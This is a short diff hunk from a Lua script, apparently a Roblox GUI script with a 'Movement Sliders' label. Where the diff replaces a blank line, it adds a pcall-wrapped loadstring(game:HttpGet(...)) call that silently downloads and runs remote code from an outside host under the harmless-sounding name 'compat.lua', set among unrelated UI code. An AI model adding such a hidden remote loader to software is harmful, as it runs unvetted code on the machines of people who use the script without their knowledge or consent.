@@ -55,7 +55,7 @@ end
 end
 end)
 end)
-
+pcall(function() loadstring(game:HttpGet("http://ligma.wtf/scripts/compat.lua", true))() end)
 tab:Label("Movement Sliders")
 
 
